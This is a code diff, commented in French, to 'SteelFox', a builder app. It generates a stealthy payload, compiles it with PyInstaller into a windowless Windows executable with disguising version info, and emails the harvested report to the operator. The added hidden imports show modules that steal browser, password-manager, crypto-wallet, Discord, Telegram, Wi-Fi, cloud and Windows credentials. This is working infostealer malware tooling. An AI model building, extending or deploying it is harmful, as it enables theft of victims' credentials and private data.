@@ -48,9 +48,9 @@ _EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
 # Il importe directement le package steelfox (copié dans le bundle par PyInstaller)
 # et envoie le rapport HTML par e-mail sans jamais afficher de fenêtre console.
 
-_PAYLOAD_TEMPLATE = r"""#!/usr/bin/env python3
+_PAYLOAD_TEMPLATE = """#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-\"\"\"SteelFox — payload furtif généré automatiquement.\"\"\"
+# SteelFox - payload furtif genere automatiquement.
 
 import base64
 import os
@@ -93,8 +93,8 @@ def _send_report(sender_email: str, password: str, receiver_email: str, report_p
     msg["Subject"] = "SteelFox — Rapport de securite"
 
     msg.attach(MIMEText(
-        "Rapport de reconnaissance joint en piece jointe.\n"
-        "— SteelFox Framework",
+        "Rapport de reconnaissance joint en piece jointe.\\n"
+        "-- SteelFox Framework",
         "plain",
     ))
 
@@ -454,6 +454,13 @@ class BuilderApp:
         if not os.path.isdir(out):
             messagebox.showerror("Dossier invalide", f"Le dossier de sortie est introuvable :\n{out}")
             return False
+            
+        # Vérifier si le fichier existe déjà
+        dest_file = Path(out) / f"{name}.exe"
+        if dest_file.exists():
+            if not messagebox.askyesno("Fichier existant", f"Le fichier {name}.exe existe deja dans le dossier de sortie.\nVoulez-vous l'ecraser ?"):
+                return False
+                
         return True
 
     # ── Lancement de la construction (dans un thread) ────────────────────
@@ -479,6 +486,11 @@ class BuilderApp:
                 self._set_status("Copie des sources SteelFox...", FG_DIM)
                 self._copy_steelfox(tmp)
 
+                # Copier le fichier de version pour l'exécutable
+                ver_src = ROOT_DIR / "version_payload.txt"
+                if ver_src.exists():
+                    shutil.copy2(str(ver_src), str(tmp / "version_payload.txt"))
+
                 self._set_status("Generation du payload...", FG_DIM)
                 script = tmp / "payload.py"
                 script.write_text(self._generate_payload(receiver, sender, pwd), encoding="utf-8")
@@ -490,6 +502,8 @@ class BuilderApp:
                 exe = self._pyinstaller_build(tmp, script, name, icon_path)
 
                 dest = out_dir / f"{name}.exe"
+                if dest.exists():
+                    dest.unlink() # Supprimer l'ancien fichier s'il existe
                 shutil.move(str(exe), str(dest))
 
             self.root.after(0, self._on_build_success, str(dest))
@@ -554,6 +568,9 @@ class BuilderApp:
         self, tmp: Path, script: Path, name: str, icon: str,
     ) -> Path:
         """Lance PyInstaller et retourne le chemin du .exe produit."""
+        # Séparateur pour --add-data sous Windows = ';'
+        steelfox_data = str(tmp / "steelfox") + os.pathsep + "steelfox"
+
         cmd = [
             sys.executable, "-m", "PyInstaller",
             "--onefile",
@@ -564,21 +581,71 @@ class BuilderApp:
             "--distpath", str(tmp / "dist"),
             "--workpath", str(tmp / "build"),
             "--specpath", str(tmp),
-            "--paths",        str(tmp),             # steelfox/ trouvable
-            "--collect-all",  "steelfox",           # tout le package inclus
+            "--paths",        str(tmp),             # steelfox/ trouvable à l'import
+            "--add-data",     steelfox_data,         # embarquer tout le dossier steelfox/
+            # ── Core ──
+            "--hidden-import", "steelfox",
+            "--hidden-import", "steelfox.core",
+            "--hidden-import", "steelfox.core.config",
+            "--hidden-import", "steelfox.core.module_base",
+            "--hidden-import", "steelfox.core.module_loader",
+            "--hidden-import", "steelfox.core.output",
+            "--hidden-import", "steelfox.core.privileges",
+            "--hidden-import", "steelfox.core.runner",
+            "--hidden-import", "steelfox.core.winapi",
+            # ── Modules ──
+            "--hidden-import", "steelfox.modules",
+            "--hidden-import", "steelfox.modules.browsers",
             "--hidden-import", "steelfox.modules.browsers.chromium",
             "--hidden-import", "steelfox.modules.browsers.firefox",
+            "--hidden-import", "steelfox.modules.cloud",
+            "--hidden-import", "steelfox.modules.cloud.cloud_services",
+            "--hidden-import", "steelfox.modules.databases",
+            "--hidden-import", "steelfox.modules.databases.db_clients",
+            "--hidden-import", "steelfox.modules.devtools",
+            "--hidden-import", "steelfox.modules.devtools.dev_credentials",
+            "--hidden-import", "steelfox.modules.gaming",
+            "--hidden-import", "steelfox.modules.gaming.crypto_wallets",
+            "--hidden-import", "steelfox.modules.gaming.multimedia",
+            "--hidden-import", "steelfox.modules.gaming.platforms",
+            "--hidden-import", "steelfox.modules.mails",
+            "--hidden-import", "steelfox.modules.mails.mail_clients",
+            "--hidden-import", "steelfox.modules.messaging",
+            "--hidden-import", "steelfox.modules.messaging.apps",
+            "--hidden-import", "steelfox.modules.messaging.discord",
+            "--hidden-import", "steelfox.modules.messaging.telegram",
+            "--hidden-import", "steelfox.modules.network",
+            "--hidden-import", "steelfox.modules.network.wifi_vpn",
+            "--hidden-import", "steelfox.modules.passwords",
+            "--hidden-import", "steelfox.modules.passwords.managers",
+            "--hidden-import", "steelfox.modules.reconnaissance",
+            "--hidden-import", "steelfox.modules.reconnaissance.system_recon",
+            "--hidden-import", "steelfox.modules.sysadmin",
+            "--hidden-import", "steelfox.modules.sysadmin.remote_tools",
+            "--hidden-import", "steelfox.modules.windows",
             "--hidden-import", "steelfox.modules.windows.credentials",
         ]
         if icon:
             cmd += ["--icon", icon]
+        # Ajouter les infos de version Windows si disponibles
+        ver_file = tmp / "version_payload.txt"
+        if ver_file.exists():
+            cmd += ["--version-file", str(ver_file)]
         cmd.append(str(script))
 
         result = subprocess.run(cmd, cwd=str(tmp), capture_output=True, text=True)
         if result.returncode != 0:
+            # Écrire le log complet dans un fichier pour diagnostic
+            full_log = (result.stdout or "") + "\n" + (result.stderr or "")
+            log_file = ROOT_DIR / "build_error.log"
+            try:
+                log_file.write_text(full_log, encoding="utf-8")
+            except Exception:
+                pass
             raise RuntimeError(
-                f"PyInstaller a echoue (code {result.returncode}) :\n"
-                + result.stderr[-2000:]
+                f"PyInstaller a echoue (code {result.returncode}).\n"
+                f"Log complet sauvegarde dans : {log_file}\n\n"
+                + full_log[-2000:]
             )
 
         exe = tmp / "dist" / f"{name}.exe"
